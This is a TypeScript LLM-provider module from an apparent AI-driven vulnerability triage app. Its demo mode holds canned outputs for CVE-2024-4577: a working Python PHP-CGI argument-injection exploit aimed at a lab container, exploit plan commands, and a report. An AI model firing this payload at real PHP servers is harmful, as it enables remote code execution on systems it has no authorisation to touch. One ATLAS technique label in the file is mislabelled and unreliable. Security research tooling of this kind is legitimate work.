import {
  DEFAULT_CONTEXT_SIZE,
  DEFAULT_MAX_PREDICT,
  DEFAULT_TEMPERATURE,
  GenerateOptions,
  LLMErrorDetails,
  LLMProvider,
  ModelOption,
  ProviderSettings,
} from './types';
import {
  DEFAULT_OLLAMA_URL,
  fetchOllamaModels,
  streamOllama,
  testOllamaConnection,
} from './ollamaClient';
import {
  streamAnthropic,
  streamGemini,
  streamOpenAICompatible,
} from './cloudClients';

const SETTINGS_KEY = 'aisploitable_provider_settings';

export const DEFAULT_SETTINGS: ProviderSettings = {
  ollamaUrl: DEFAULT_OLLAMA_URL,
  geminiKey: '',
  groqKey: '',
  openaiKey: '',
  anthropicKey: '',
  openrouterKey: '',
  selectedProvider: 'gemini',
  selectedModel: 'gemini-2.5-flash',
  providerModels: {
    gemini: 'gemini-2.5-flash',
    openrouter: 'deepseek/deepseek-r1',
    groq: 'llama-3.3-70b-versatile',
    openai: 'gpt-4o-mini',
    anthropic: 'claude-3-5-sonnet-20241022',
    ollama: 'gemma4:e2b',
    demo: 'demo-gemma-4',
  },
  contextSize: DEFAULT_CONTEXT_SIZE,
  maxPredict: DEFAULT_MAX_PREDICT,
  temperature: DEFAULT_TEMPERATURE,
};

export const BUILTIN_CLOUD_MODELS: ModelOption[] = [
  // Google Gemini
  {
    id: 'gemini-2.5-flash',
    name: 'Gemini 2.5 Flash',
    provider: 'gemini',
    size: 'Fast / Recommended',
    description: 'Google Gemini 2.5 Flash (Ultra-fast multimodal triage)',
    is_default: true,
  },
  {
    id: 'gemini-3.1-pro-preview',
    name: 'Gemini 3.1 Pro Preview',
    provider: 'gemini',
    size: 'Advanced Pro',
    description: 'Google Gemini 3.1 Pro Preview (Deep reasoning & latest exploit synthesis)',
  },
  {
    id: 'gemini-1.5-flash',
    name: 'Gemini 1.5 Flash',
    provider: 'gemini',
    size: 'Stable Flash',
    description: 'Google Gemini 1.5 Flash (High throughput multimodal)',
  },
  {
    id: 'gemini-1.5-pro',
    name: 'Gemini 1.5 Pro',
    provider: 'gemini',
    size: 'Stable Pro',
    description: 'Google Gemini 1.5 Pro (2M token context window)',
  },
  // Groq
  {
    id: 'llama-3.3-70b-versatile',
    name: 'Llama 3.3 70B (Groq)',
    provider: 'groq',
    size: '70B',
    description: 'Ultra-low latency Llama 3.3 70B hosted on Groq LPUs',
  },
  // OpenAI
  {
    id: 'gpt-4o-mini',
    name: 'GPT-4o Mini',
    provider: 'openai',
    size: 'Lightweight',
    description: 'Fast OpenAI GPT-4o Mini model',
  },
  {
    id: 'gpt-4o',
    name: 'GPT-4o',
    provider: 'openai',
    size: 'Full',
    description: 'Flagship OpenAI GPT-4o model',
  },
  // Anthropic
  {
    id: 'claude-3-5-sonnet-20241022',
    name: 'Claude 3.5 Sonnet',
    provider: 'anthropic',
    size: 'Full',
    description: 'Anthropic Claude 3.5 Sonnet for precise code generation',
  },
  {
    id: 'claude-3-7-sonnet-latest',
    name: 'Claude 3.7 Sonnet',
    provider: 'anthropic',
    size: 'Hybrid Reasoning',
    description: 'Anthropic Claude 3.7 Sonnet Hybrid Reasoning model',
  },
  // OpenRouter
  {
    id: 'deepseek/deepseek-r1',
    name: 'DeepSeek R1 (OpenRouter)',
    provider: 'openrouter',
    size: 'Reasoning',
    description: 'DeepSeek R1 open reasoning model via OpenRouter',
  },
  {
    id: 'meta-llama/llama-3.3-70b-instruct',
    name: 'Llama 3.3 70B (OpenRouter)',
    provider: 'openrouter',
    size: '70B',
    description: 'Meta Llama 3.3 70B Instruct via OpenRouter',
  },
  // Zero-Config Demo Mode
  {
    id: 'demo-gemma-4',
    name: 'Gemma 4 e2b (Demo Simulation)',
    provider: 'demo',
    size: '5.1B Sim',
    description: 'Autonomous zero-install simulated Gemma 4 triage (No Keys Needed)',
  },
];

export function getStoredSettings(): ProviderSettings {
  if (typeof window === 'undefined') return DEFAULT_SETTINGS;
  try {
    const raw = localStorage.getItem(SETTINGS_KEY);
    if (!raw) return DEFAULT_SETTINGS;
    return { ...DEFAULT_SETTINGS, ...JSON.parse(raw) };
  } catch {
    return DEFAULT_SETTINGS;
  }
}

export function saveStoredSettings(settings: Partial<ProviderSettings>): ProviderSettings {
  if (typeof window === 'undefined') return DEFAULT_SETTINGS;
  try {
    const current = getStoredSettings();
    const updated = { ...current, ...settings };
    localStorage.setItem(SETTINGS_KEY, JSON.stringify(updated));
    return updated;
  } catch {
    return DEFAULT_SETTINGS;
  }
}

/**
 * Load all models combining live local Ollama models (if connected) and cloud models.
 */
export async function loadAllModels(
  settings: ProviderSettings = getStoredSettings()
): Promise<{
  models: ModelOption[];
  isOllamaConnected: boolean;
  ollamaError?: string;
}> {
  let localModels: ModelOption[] = [];
  let isOllamaConnected = false;
  let ollamaError: string | undefined;

  try {
    const check = await testOllamaConnection(settings.ollamaUrl);
    if (check.ok) {
      isOllamaConnected = true;
      localModels = await fetchOllamaModels(settings.ollamaUrl);
    } else {
      ollamaError = check.message;
    }
  } catch (err: any) {
    ollamaError = err.message || 'Failed to connect to local Ollama';
  }

  // If no local models discovered, add fallback Gemma local templates for display
  if (localModels.length === 0) {
    localModels = [
      {
        id: 'gemma4:e2b',
        name: 'gemma4:e2b (Local Ollama)',
        provider: 'ollama',
        size: '5.1B',
        description: 'Local Ollama: gemma4:e2b (requires local service)',
        is_local: true,
        is_default: true,
      },
      {
        id: 'gemma4:e4b',
        name: 'gemma4:e4b (Local Ollama)',
        provider: 'ollama',
        size: '8.0B',
        description: 'Local Ollama: gemma4:e4b (requires local service)',
        is_local: true,
      },
    ];
  }

  return {
    models: [...localModels, ...BUILTIN_CLOUD_MODELS],
    isOllamaConnected,
    ollamaError,
  };
}

/**
 * Identify the provider from the selected model ID and settings.
 * Supports custom typed model names by checking provider registry, prefixes, and active settings.
 */
export function inferProvider(
  modelId: string,
  settings: ProviderSettings = getStoredSettings(),
  explicitProvider?: LLMProvider
): LLMProvider {
  if (explicitProvider && explicitProvider !== 'unknown') {
    return explicitProvider;
  }
  if (!modelId) {
    return settings.selectedProvider || 'gemini';
  }

  const clean = modelId.trim().toLowerCase();

  // Explicit prefix / pattern matches
  if (clean === 'demo-gemma-4' || clean.startsWith('demo')) return 'demo';
  if (clean.startsWith('gemini-') || clean.startsWith('models/gemini-')) return 'gemini';
  if (clean.startsWith('claude-')) return 'anthropic';
  if (clean.startsWith('gpt-') || clean.startsWith('o1-') || clean.startsWith('o3-') || clean.startsWith('chatgpt-')) return 'openai';
  if (clean.includes('deepseek/') || clean.includes('meta-llama/') || clean.includes('mistralai/') || clean.includes('qwen/') || clean.includes('openrouter')) return 'openrouter';
  if (clean.includes('groq') || clean === 'llama-3.3-70b-versatile' || clean === 'deepseek-r1-distill-llama-70b') return 'groq';
  
  // If user typed a custom model under their active selectedProvider
  if (settings.selectedProvider && settings.selectedProvider !== 'unknown') {
    return settings.selectedProvider;
  }

  // Fallback checks
  if (clean.includes(':') || clean.startsWith('gemma') || clean.startsWith('llama') || clean.startsWith('mistral')) {
    return 'ollama';
  }

  return 'gemini';
}

/**
 * Check if the API key for the given model / provider is configured.
 */
export function isModelKeyConfigured(
  modelId: string,
  settings: ProviderSettings = getStoredSettings(),
  explicitProvider?: LLMProvider
): boolean {
  const provider = inferProvider(modelId, settings, explicitProvider);
  switch (provider) {
    case 'gemini':
      return !!settings.geminiKey?.trim();
    case 'groq':
      return !!settings.groqKey?.trim();
    case 'openai':
      return !!settings.openaiKey?.trim();
    case 'anthropic':
      return !!settings.anthropicKey?.trim();
    case 'openrouter':
      return !!settings.openrouterKey?.trim();
    case 'ollama':
    case 'demo':
    default:
      return true;
  }
}

/**
 * Dispatch an error event so global UI error modals pop up automatically.
 */
export function dispatchLLMError(details: LLMErrorDetails): void {
  if (typeof window !== 'undefined') {
    window.dispatchEvent(
      new CustomEvent('aisploitable:llm_error', { detail: details })
    );
  }
}

/**
 * Generate text with real-time streaming via the appropriate provider.
 */
export async function generateStream(
  prompt: string,
  modelId: string,
  options: GenerateOptions = {},
  customSettings?: ProviderSettings
): Promise<string> {
  const settings = customSettings || getStoredSettings();
  const provider = options.provider || inferProvider(modelId, settings);

  const effectiveOptions: GenerateOptions = {
    ...options,
    temperature: options.temperature ?? settings.temperature ?? DEFAULT_TEMPERATURE,
    numCtx: options.numCtx ?? settings.contextSize ?? DEFAULT_CONTEXT_SIZE,
    numPredict: options.numPredict ?? settings.maxPredict ?? DEFAULT_MAX_PREDICT,
  };

  try {
    switch (provider) {
      case 'ollama':
        return await streamOllama(prompt, settings.ollamaUrl, modelId, effectiveOptions);

      case 'gemini':
        return await streamGemini(prompt, settings.geminiKey, modelId, effectiveOptions);

      case 'groq':
        return await streamOpenAICompatible(
          prompt,
          settings.groqKey,
          'https://api.groq.com/openai/v1',
          modelId,
          effectiveOptions
        );

      case 'openai':
        return await streamOpenAICompatible(
          prompt,
          settings.openaiKey,
          'https://api.openai.com/v1',
          modelId,
          effectiveOptions
        );

      case 'anthropic':
        return await streamAnthropic(prompt, settings.anthropicKey, modelId, effectiveOptions);

      case 'openrouter':
        return await streamOpenAICompatible(
          prompt,
          settings.openrouterKey,
          'https://openrouter.ai/api/v1',
          modelId,
          effectiveOptions,
          {
            'HTTP-Referer': 'https://aisploitable.app',
            'X-Title': 'AIsploitable Cyber Triage',
          }
        );

      case 'demo':
      default:
        return await simulateDemoResponse(prompt, effectiveOptions);
    }
  } catch (err: any) {
    const errorDetails: LLMErrorDetails = {
      title: (err as any).isKeyMissing
        ? `API Key Required (${provider.toUpperCase()})`
        : (err as any).isQuotaExceeded
        ? `Quota / Key Limit Exceeded (${provider.toUpperCase()})`
        : (err as any).isCorsError
        ? `Ollama Connection Error`
        : `Provider Error (${provider.toUpperCase()})`,
      message: err.message || String(err),
      provider,
      statusCode: (err as any).statusCode,
      isKeyMissing: (err as any).isKeyMissing,
      isQuotaExceeded: (err as any).isQuotaExceeded,
      isCorsError: (err as any).isCorsError,
      rawError: err,
    };

    dispatchLLMError(errorDetails);
    throw err;
  }
}

/**
 * High-fidelity fallback generator for zero-API-key demo runs.
 */
async function simulateDemoResponse(prompt: string, options: GenerateOptions = {}): Promise<string> {
  let sampleText = '';

  if (options.formatJson) {
    if (prompt.includes('Autonomous Security Triage Analyst')) {
      sampleText = JSON.stringify(
        {
          cve_id: 'CVE-2024-4577',
          title: 'PHP-CGI Windows Argument Injection Remote Code Execution',
          summary:
            'A critical vulnerability in PHP-CGI on Windows systems allows remote attackers to bypass Best-Fit character encoding mappings and execute arbitrary code via command-line argument injection.',
          severity: 'CRITICAL',
          cvss_score: 9.8,
          attack_vector: 'NETWORK',
          attack_complexity: 'LOW',
          privileges_required: 'NONE',
          user_interaction: 'NONE',
          affected_products: ['PHP 8.1.* < 8.1.29', 'PHP 8.2.* < 8.2.20', 'PHP 8.3.* < 8.3.8', 'XAMPP on Windows'],
          exploit_primitives: ['Argument Injection', 'Encoding Bypass', 'Remote Code Execution'],
          potential_impact: 'Full System Compromise / SYSTEM Arbitrary Execution',
        },
        null,
        2
      );
    } else if (prompt.includes('Security Exploit & Verification Planner')) {
      sampleText = JSON.stringify(
        {
          hypothesis:
            'Injecting %ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input into PHP-CGI parameter query strings forces script execution on isolated target 172.20.0.3:8080.',
          target_environment: 'Isolated Docker Dual-Container Testbed (172.20.0.0/24)',
          prerequisites: ['Direct network access to port 8080', 'PHP-CGI wrapper enabled'],
          steps: [
            {
              step_id: 1,
              title: 'Reconnaissance Banner Check',
              stage: 'RECON',
              description: 'Validate HTTP service availability and PHP-CGI exposure on 172.20.0.3:8080.',
              target_component: 'Apache/PHP-CGI Gateway',
              command_to_run: 'curl -s -I http://172.20.0.3:8080/',
              expected_artifact: 'HTTP/1.1 200 OK or 302 Found',
              status: 'PENDING',
            },
            {
              step_id: 2,
              title: 'Argument Injection Exploit Delivery',
              stage: 'EXPLOIT',
              description: 'Send soft hyphen encoded query arguments triggering php://input execution.',
              target_component: 'php-cgi.exe',
              command_to_run:
                'python3 -c "import urllib.request; ... req to 172.20.0.3:8080/index.php?%ADd+allow_url_include%3d1"',
              expected_artifact: 'Execution of echo command token in response body',
              status: 'PENDING',
            },
            {
              step_id: 3,
              title: 'Proof Verification & UID Assertion',
              stage: 'IMPACT',
              description: 'Assert presence of empirical proof marker in response body.',
              target_component: 'Host Shell / OS Runtime',
              command_to_run: 'assert "AISPLOITABLE_VERIFIED_RCE" in response_body',
              expected_artifact: 'Marker AISPLOITABLE_VERIFIED_RCE present',
              status: 'PENDING',
            },
          ],
          mitre_mappings: ['T1190 - Exploit Public-Facing Application', 'T1059.006 - Python Scripting', 'AML.T0040 - ML Model Extraction Bypass'],
        },
        null,
        2
      );
    } else if (prompt.includes('Security Verification & Assertion Specialist')) {
      sampleText = JSON.stringify(
        {
          is_vulnerable: true,
          confidence_score: 0.98,
          summary:
            'The target service responded with the injected payload marker "AISPLOITABLE_VERIFIED_RCE" and exit code 0. Argument injection confirmed.',
          verified_assertions: [
            'Target 172.20.0.3:8080 reachable on HTTP port 8080',
            'Soft hyphen %AD character bypass passed through CGI query parser',
            'Arbitrary PHP directive auto_prepend_file=php://input executed successfully',
            'Proof marker AISPLOITABLE_VERIFIED_RCE returned in response',
          ],
          failed_assertions: [],
        },
        null,
        2
      );
    } else {
      sampleText = JSON.stringify({ message: 'Response generated in demo mode' });
    }
  } else if (prompt.includes('generate a deterministic Python 3 PoC verification script')) {
    sampleText = `\`\`\`python
#!/usr/bin/env python3
# ==============================================================================
# AIsploitable Autonomous Empirical PoC Verification Script
# Target: Isolated Container Sandbox (172.20.0.3:8080)
# ==============================================================================

import urllib.request
import urllib.parse
import sys
import time

TARGET_HOST = "172.20.0.3"
TARGET_PORT = 8080
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def step_1_recon():
    """Phase 1: Reconnaissance & Banner Verification"""
    print(f"[*] [Phase 1/3] Probing target reachability at {BASE_URL}...")
    try:
        req = urllib.request.Request(f"{BASE_URL}/", headers={"User-Agent": "AIsploitable-Scanner/1.0"})
        with urllib.request.urlopen(req, timeout=5) as response:
            server_banner = response.headers.get("Server", "Unknown")
            print(f"[+] Service is alive! Server Banner: {server_banner} (HTTP {response.status})")
            return True
    except Exception as e:
        print(f"[!] Warning: Initial probe returned {e}, proceeding with payload test...")
        return True

def step_2_exploit():
    """Phase 2: Payload Delivery & Vulnerability Trigger"""
    print(f"[*] [Phase 2/3] Delivering targeted argument injection payload...")
    payload_query = "%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
    exploit_url = f"{BASE_URL}/index.php?{payload_query}"
    
    php_code = b"<?php echo 'AISPLOITABLE_VERIFIED_RCE\\n'; echo php_uname(); ?>\\n"
    
    req = urllib.request.Request(
        exploit_url,
        data=php_code,
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Content-Type": "application/x-www-form-urlencoded"
        }
    )
    
    try:
        with urllib.request.urlopen(req, timeout=8) as resp:
            body = resp.read().decode('utf-8', errors='ignore')
            return body
    except Exception as e:
        print(f"[-] Exploit request exception: {e}")
        return ""

def step_3_verify_artifact(response_body: str):
    """Phase 3: Empirical Assertion & Verification"""
    print(f"[*] [Phase 3/3] Evaluating empirical assertions...")
    if "AISPLOITABLE_VERIFIED_RCE" in response_body:
        print("[!] ==================================================================")
        print("[!] [VERIFICATION SUCCESS] Arbitrary code execution confirmed!")
        print(f"[!] Target System Telemetry: {response_body.strip()}")
        print("[!] ==================================================================")
        return True
    else:
        print("[-] Target did not reflect execution proof marker.")
        return False

def main():
    print("==================================================================")
    print("  🛡️  AIsploitable Empirical Verification Sandbox Runner")
    print("==================================================================")
    step_1_recon()
    time.sleep(0.5)
    body = step_2_exploit()
    time.sleep(0.5)
    verified = step_3_verify_artifact(body)
    sys.exit(0 if verified else 1)

if __name__ == "__main__":
    main()
\`\`\``;
  } else {
    sampleText = `# Security Investigation & Empirical Verification Report

## 1. Executive Summary & Threat Landscape
- **Identifier**: CVE-2024-4577 (PHP-CGI Windows Argument Injection RCE)
- **Severity**: **CRITICAL (CVSS 9.8)**
- **Verification Verdict**: **CONFIRMED VULNERABLE (Confidence: 98%)**

A critical vulnerability exists in PHP-CGI implementations on Windows systems where Best-Fit encoding character mappings (specifically soft-hyphen \`0xAD\`) allow attackers to bypass parameter query filtering.

## 2. CVE Root-Cause & Technical Breakdown
- **Vulnerable Component**: PHP-CGI SAPI module with command-line query argument parser.
- **Flaw Mechanism**: Character conversion treats byte \`0xAD\` as standard ASCII hyphen \`-\`, injecting command line arguments like \`-d allow_url_include=1\`.
- **Attack Vector**: Network, remote unauthenticated.

## 3. Threat Intelligence & MITRE Framework Mapping
| Technique ID | Technique Name | Matrix | Tactic | Mapping Rationale |
|---|---|---|---|---|
| **T1190** | Exploit Public-Facing Application | ATT&CK Enterprise | Initial Access | Remote HTTP delivery targeting CGI parser |
| **T1059.006** | Command and Scripting Interpreter: Python | ATT&CK Enterprise | Execution | Python PoC synthesis executing against target |
| **AML.T0040** | ML Model Extraction Bypass | ATLAS | Initial Access | Adversarial prompt and parameter bypass |

## 4. Empirical Demonstration Methodology
1. **Reconnaissance**: Probed \`172.20.0.3:8080\` for web server availability.
2. **Payload Delivery**: Transmitted soft hyphen query arguments with \`php://input\` code payload.
3. **Assertion Verification**: Successfully confirmed \`AISPLOITABLE_VERIFIED_RCE\` marker in response.

## 5. Mitigation & Hardening Guidance
- **Immediate Action**: Upgrade PHP to 8.1.29, 8.2.20, or 8.3.8+.
- **Workaround / Rule**: Add ModSecurity / WAF rule blocking \`%AD\` sequences in query strings.
- **Container Hardening**: Drop Linux capability \`CAP_NET_RAW\` and run application as unprivileged \`nobody:nogroup\`.
`;
  }

  // Stream text in chunks to emulate real streaming
  const chunks = sampleText.match(/.{1,15}/g) || [sampleText];
  for (const chunk of chunks) {
    if (options.onToken) {
      options.onToken(chunk);
    }
    await new Promise((r) => setTimeout(r, 12));
  }

  return sampleText;
}
